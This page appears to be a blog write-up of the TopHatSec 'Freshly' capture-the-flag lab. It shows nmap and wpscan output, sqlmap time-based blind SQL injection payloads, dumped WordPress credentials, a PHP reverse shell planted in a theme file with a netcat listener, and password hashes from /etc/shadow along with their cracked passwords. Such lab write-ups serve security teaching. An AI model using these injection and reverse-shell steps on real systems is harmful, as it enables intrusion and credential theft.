<!DOCTYPE html>
<html lang="en-us">
<head>
<meta charset="utf-8">
<meta name="description" content="">
<meta name="keywords" content="">
<meta name="author" content="">
<meta name="generator" content="Hugo 0.15" />
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="http://rastamouse.me/css/style.css" type="text/css">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Code+Pro:400,700" type="text/css">
<link rel="alternate" href="http://rastamouse.me/index.xml" type="application/rss+xml" title="rastamouse.me">
<title>TopHatSec: Freshly - rastamouse.me</title>
</head>
<body>

<header>
  <div class="container">
    <a class="path" href="http://rastamouse.me/">[rastamouse.me]</a>
    <span class="caret"># _</span>
  </div>
</header>

<div class="container">


<main role="main" class="article">
  
<article class="single" itemscope itemtype="http://schema.org/BlogPosting">
  <div class="meta">

    <span class="key">published on</span>
    <span class="val"><time itemprop="datePublished" datetime="2015-04-06">April 06, 2015</time></span>


    <span class="key">in</span>
    <span class="val">

        <a href="http://rastamouse.me/categories/writeup">writeup</a>

    </span>


    <br>
    <span class="key">tags:</span>
    <span class="val">

        <a href="http://rastamouse.me/tags/tophatsec">tophatsec</a>

    </span>

  </div>
  <h1 class="headline" itemprop="headline">TopHatSec: Freshly</h1>
  <section class="body" itemprop="articleBody">
    

<p>The goal of this challenge is to break into the machine via the web and find the secret hidden in a sensitive file.</p>

<h2 id="discovery:c9074d49792693247d5874f03ce0ab60">Discovery</h2>

<pre><code class="language-text">root@kali:~# nmap -n -p- -A 192.168.0.55

PORT     STATE SERVICE  VERSION
80/tcp   open  http     Apache httpd 2.4.7 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
443/tcp  open  ssl/http Apache httpd
|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-02-17T03:30:05+00:00
|_Not valid after:  2025-02-14T03:30:05+00:00
|_ssl-date: 2094-10-25T22:49:26+00:00; +79y202d9h02m31s from local time.
8080/tcp open  http     Apache httpd
|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
|_http-title: Site doesn't have a title (text/html).
</code></pre>

<h3 id="port-80:c9074d49792693247d5874f03ce0ab60">Port 80</h3>

<p>Let&rsquo;s start at the top&hellip; Browsing to port 80, you see little more than a nice Star Wars GIF.  The page source is very simple: <code>&lt;img src=&quot;tumblr_mdeo27ZZjB1r6pf3eo1_500.gif&quot;&gt;</code>, so nothing there.  Let&rsquo;s not start steg analysis unless we have to.</p>

<div align="center">
	<figure style="background-color: #f2f0ec;" >
    
        <img src="/img/writeups/freshly/starwars.gif"  />
    
    
</figure>
</div>

<h3 id="port-443:c9074d49792693247d5874f03ce0ab60">Port 443</h3>

<p>When you visit this page (and accept the poor certificate), you find a &ldquo;simple&rdquo; link to a Wordpress installation.  I say simple&hellip; the link is actually generated by some crazy javascript.</p>

<pre><code class="language-javascript">&lt;a href=&quot;wordpress/&quot;&gt;Nice Find!...Proceed&lt;/a&gt;
&lt;script pagespeed_no_defer=&quot;&quot; type=&quot;text/javascript&quot;&gt;//&lt;![CDATA[
(function(){var e=encodeURIComponent,f=window,h=document,m=&quot;width&quot;,n=&quot;documentElement&quot;,p=&quot;height&quot;,q=&quot;length&quot;,r=&quot;prototype&quot;,s=&quot;body&quot;,t=&quot;&amp;&quot;,u=&quot;&amp;ci=&quot;,w=&quot;&amp;n=&quot;,x=&quot;&amp;rd=&quot;,y=&quot;,&quot;,z=&quot;?&quot;,A=&quot;Content-Type&quot;,B=&quot;Microsoft.XMLHTTP&quot;,C=&quot;Msxml2.XMLHTTP&quot;,D=&quot;POST&quot;,E=&quot;application/x-www-form-urlencoded&quot;,F=&quot;img&quot;,G=&quot;input&quot;,H=&quot;load&quot;,I=&quot;oh=&quot;,J=&quot;on&quot;,K=&quot;pagespeed_url_hash&quot;,L=&quot;url=&quot;,M=function(a,c,d){if(a.addEventListener)a.addEventListener(c,d,!1);else if(a.attachEvent)a.attachEvent(J+c,d);else{var b=a[J+c];a[J+c]=function(){d.call(this);b&amp;&amp;b.call(this)}}};f.pagespeed=f.pagespeed||{};var N=f.pagespeed,O=function(a,c,d,b,g){this.d=a;this.f=c;this.g=d;this.a=g;this.c={height:f.innerHeight||h[n].clientHeight||h[s].clientHeight,width:f.innerWidth||h[n].clientWidth||h[s].clientWidth};this.e=b;this.b={}};O[r].j=function(a){a=a.getBoundingClientRect();return{top:a.top+(void 0!==f.pageYOffset?f.pageYOffset:(h[n]||h[s].parentNode||h[s]).scrollTop),left:a.left+(void 0!==f.pageXOffset?f.pageXOffset:(h[n]||h[s].parentNode||h[s]).scrollLeft)}};O[r].i=function(a){if(0&gt;=a.offsetWidth&amp;&amp;0&gt;=a.offsetHeight)return!1;a=this.j(a);var c=a.top.toString()+y+a.left.toString();if(this.b.hasOwnProperty(c))return!1;this.b[c]=!0;return a.top&lt;=this.c[p]&amp;&amp;a.left&lt;=this.c[m]};O[r].l=function(){for(var a=[F,G],c=[],d={},b=0;b&lt;a[q];++b)for(var g=h.getElementsByTagName(a[b]),k=0;k&lt;g[q];++k){var v=g[k].getAttribute(K);v&amp;&amp;g[k].getBoundingClientRect&amp;&amp;this.i(g[k])&amp;&amp;!(v in d)&amp;&amp;(c.push(v),d[v]=!0)}b=!1;a=I+this.g;this.a&amp;&amp;(a+=w+this.a);if(0!=c[q]){a+=u+e(c[0]);for(b=1;b&lt;c[q];++b){d=y+e(c[b]);if(131072&lt;a[q]+d[q])break;a+=d}b=!0}this.e&amp;&amp;(d=x+e(JSON.stringify(this.h())),131072&gt;=a[q]+d[q]&amp;&amp;(a+=d),b=!0);N.criticalImagesBeaconData=a;if(b){var c=this.d,b=this.f,l;if(f.XMLHttpRequest)l=new XMLHttpRequest;else if(f.ActiveXObject)try{l=new ActiveXObject(C)}catch(P){try{l=new ActiveXObject(B)}catch(Q){}}l&amp;&amp;(l.open(D,c+(-1==c.indexOf(z)?z:t)+L+e(b)),l.setRequestHeader(A,E),l.send(a))}};O[r].h=function(){for(var a={},c=h.getElementsByTagName(F),d=0;d&lt;c[q];++d){var b=c[d],g=b.getAttribute(K);if(&quot;undefined&quot;==typeof b.naturalWidth||&quot;undefined&quot;==typeof b.naturalHeight||&quot;undefined&quot;==typeof g)break;if(&quot;undefined&quot;==typeof a[b.src]&amp;&amp;0&lt;b[m]&amp;&amp;0&lt;b[p]&amp;&amp;0&lt;b.naturalWidth&amp;&amp;0&lt;b.naturalHeight||&quot;undefined&quot;!=typeof a[b.src]&amp;&amp;b[m]&gt;=a[b.src].n&amp;&amp;b[p]&gt;=a[b.src].m)a[g]={renderedWidth:b[m],renderedHeight:b[p],originalWidth:b.naturalWidth,originalHeight:b.naturalHeight}}return a};N.k=function(a,c,d,b,g){var k=new O(a,c,d,b,g);M(f,H,function(){f.setTimeout(function(){k.l()},0)})};N.criticalImagesBeaconInit=N.k;})();pagespeed.criticalImagesBeaconInit('/mod_pagespeed_beacon','https://192.168.0.55/','jcuzgYIkWZ',false,'QDez1u7wRsQ');
//]]&gt;&lt;/script&gt;
</code></pre>

<p>I literally have no idea&hellip; so let&rsquo;s continue to Wordpress.  There is not much content to go through, one post and a store where you can buy Custom Nuts and Pop Rocks, yum.  It also looks like this has been installed using <code>Bitnami WordPress Stack</code>, this might be handy information later.</p>

<div align="center">
	<figure style="background-color: #f2f0ec;" >
    
        <img src="/img/writeups/freshly/wordpress.jpg"  />
    
    
</figure>
</div>

<h3 id="port-8080:c9074d49792693247d5874f03ce0ab60">Port 8080</h3>

<p>This looks to be exactly the same as what is running on port 443, but in plaintext.</p>

<h2 id="wordpress:c9074d49792693247d5874f03ce0ab60">Wordpress</h2>

<p>Continuing with Wordpress, I ran <code>wpscan</code> against it and quite a lot popped (I&rsquo;ve snipped out a lot of the extra information).</p>

<pre><code class="language-text">root@kali:~# wpscan --url http://192.168.0.55:8080/wordpress/ --enumerate p

[+] URL: http://192.168.0.55:8080/wordpress/

[!] The WordPress 'http://192.168.0.55:8080/wordpress/readme.html' file exists exposing a version number
[!] Full Path Disclosure (FPD) in: 'http://192.168.0.55:8080/wordpress/wp-includes/rss-functions.php'

[+] WordPress version 4.1.1 identified from meta generator

[+] Enumerating installed plugins  ...
[+] We found 12 plugins:

[!] Title: Cart66 Lite &lt;= 1.5.3 - SQL Injection
    Reference: https://wpvulndb.com/vulnerabilities/7737
    Reference: https://research.g0blin.co.uk/g0blin-00022/
    Reference: http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-9442
[i] Fixed in: 1.5.4

[!] Title: Google Analytics by Yoast 5.3.2 - Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/7838
    Reference: http://packetstormsecurity.com/files/130716/
    Reference: http://osvdb.org/119334

[!] Title: ProPlayer 4.7.9.1 - SQL Injection
    Reference: https://wpvulndb.com/vulnerabilities/6912
    Reference: http://osvdb.org/93564
    Reference: http://www.exploit-db.com/exploits/25605/

[!] Title: WPtouch &lt;= 3.6.6 - Unvalidated Open Redirect
    Reference: https://wpvulndb.com/vulnerabilities/7837
    Reference: https://wordpress.org/plugins/wptouch/changelog/
[i] Fixed in: 3.7
</code></pre>

<p>So of the 12 plugins found, 4 of them are effected by various vulnerabilities.  I started off by looking at the Cart66 SQLi, but it seems we have to be authenticated to Wordpress for it to work.  Unfortunately, the ProPlayer SQLi didn&rsquo;t work for me either.  So it looks like we&rsquo;re back to square one.</p>

<h2 id="sqli:c9074d49792693247d5874f03ce0ab60">SQLi!</h2>

<p>I circled back around to port 80, and started looking for any other files or directories etc.</p>

<pre><code class="language-text">root@kali:~# wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/megabeast.txt --hc 404 http://192.168.0.55/FUZZ.php

24691:  C=200     15 L	      23 W	    276 Ch	  &quot; - login&quot;
</code></pre>

<p>I found <code>login.php</code>, which contains a simple form.  An incorrect login simply produces the number <code>0</code> underneath.</p>

<div align="center">
	<figure style="background-color: #f2f0ec;" >
    
        <img src="/img/writeups/freshly/logon.jpg"  />
    
    
</figure>
</div>

<p>I tried some manual injections, but couldn&rsquo;t force any SQL errors, so I fed the POST data into <code>sqlmap</code> to see if anything came up.  Luckily, it did.</p>

<pre><code class="language-text">root@kali:~# sqlmap -u &quot;http://192.168.0.55/login.php&quot; --data &quot;user=1&amp;password=1&amp;s=Submit&quot;

Parameter: password (POST)
    Type: AND/OR time-based blind
    Title: MySQL &gt; 5.0.11 AND time-based blind (SELECT)
    Payload: user=1&amp;password=1' AND (SELECT * FROM (SELECT(SLEEP(5)))wVhd) AND 'Irjg'='Irjg&amp;s=Submit

Parameter: user (POST)
    Type: AND/OR time-based blind
    Title: MySQL &gt; 5.0.11 AND time-based blind (SELECT)
    Payload: user=1' AND (SELECT * FROM (SELECT(SLEEP(5)))bTUC) AND 'dvKT'='dvKT&amp;password=1&amp;s=Submit

web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.5.9
back-end DBMS: MySQL 5.0.11
</code></pre>

<p>So both the <code>user</code> and <code>password</code> fields are vulnerable to a very annoying blind injection.  My hope from here, was to obtain administrative credentials for Wordpress&hellip;</p>

<pre><code class="language-text">available databases [7]:
[*] information_schema
[*] login
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] users
[*] wordpress8080

Database: wordpress8080
[1 table]
+-------+
| users |
+-------+

Database: wordpress8080
Table: users
[1 entry]
+----------+---------------------+
| username | password            |
+----------+---------------------+
| admin    | SuperSecretPassword |
+----------+---------------------+
</code></pre>

<p><div align="center">
	<figure style="background-color: #f2f0ec;" >
    
        <img src="/img/writeups/freshly/admin.jpg"  />
    
    
</figure>
</div>
<div align="center">
	<figure style="background-color: #f2f0ec;" >
    
        <img src="/img/writeups/freshly/dashboard.jpg"  />
    
    
</figure>
</div></p>

<h2 id="php-shell:c9074d49792693247d5874f03ce0ab60">PHP Shell</h2>

<p>Now that I had access to Wordpress, I knew I could get a PHP shell on the host.  <code>Appearance &gt; Editor</code> gives you access to all of the PHP templates.  I went into <code>404.php</code> and completely replaced the code with <code>php-reverse-shell.php</code> from Kali.</p>

<div align="center">
	<figure style="background-color: #f2f0ec;" >
    
        <img src="/img/writeups/freshly/404.jpg"  />
    
    
</figure>
</div>

<p>Start a <code>netcat</code> listener and <code>cURL</code> the URL.</p>

<pre><code class="language-text">root@kali:~# curl http://192.168.0.55:8080/wordpress/404.php
</code></pre>

<pre><code class="language-text">root@kali:~# nc -lnvp 4444
listening on [any] 4444 ...
connect to [192.168.0.54] from (UNKNOWN) [192.168.0.55] 50235
Linux Freshly 3.13.0-45-generic #74-Ubuntu SMP Tue Jan 13 19:37:48 UTC 2015 i686 athlon i686 GNU/Linux
</code></pre>

<p>Whilst poking around the filesystem, I found the flag in <code>/etc/passwd</code>.</p>

<pre><code class="language-text">$ cat /etc/passwd

# YOU STOLE MY SECRET FILE!
# SECRET = &quot;NOBODY EVER GOES IN, AND NOBODY EVER COMES OUT!&quot;
</code></pre>

<h2 id="root:c9074d49792693247d5874f03ce0ab60">Root</h2>

<p>A bad &lsquo;file permission error&rsquo; has been made, allowing <code>/etc/shadow</code> to be world readable.</p>

<pre><code class="language-text">-rwxr-xr-x 1 root shadow 1030 Feb 17 01:56 /etc/shadow

root:$6$If.Y9A3d$L1/qOTmhdbImaWb40Wit6A/wP5tY5Ia0LB9HvZvl1xAGFKGP5hm9aqwvFtDIRKJaWkN8cuqF6wMvjl1gxtoR7/:16483:0:99999:7:::
user:$6$MuqQZq4i$t/lNztnPTqUCvKeO/vvHd9nVe3yRoES5fEguxxHnOf3jR/zUl0SFs825OM4MuCWlV7H/k2QCKiZ3zso.31Kk31:16483:0:99999:7:::
candycane:$6$gfTgfe6A$pAMHjwh3aQV1lFXtuNDZVYyEqxLWd957MSFvPiPaP5ioh7tPOwK2TxsexorYiB0zTiQWaaBxwOCTRCIVykhRa/:16483:0:99999:7:::
</code></pre>

<p><code>candycane</code> has a weak password, whereas <code>user</code> and <code>root</code> are subject to the same password re-use.</p>

<pre><code class="language-text">root: SuperSecretPassword
user: SuperSecretPassword
candycane: password
</code></pre>

  </section>
</article>

</main>


</div>

<footer>
  <div class="container">
    <span class="copyright">&copy; 2015  rastamouse.me - <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a></span>
  </div>
</footer>

</body>
</html>

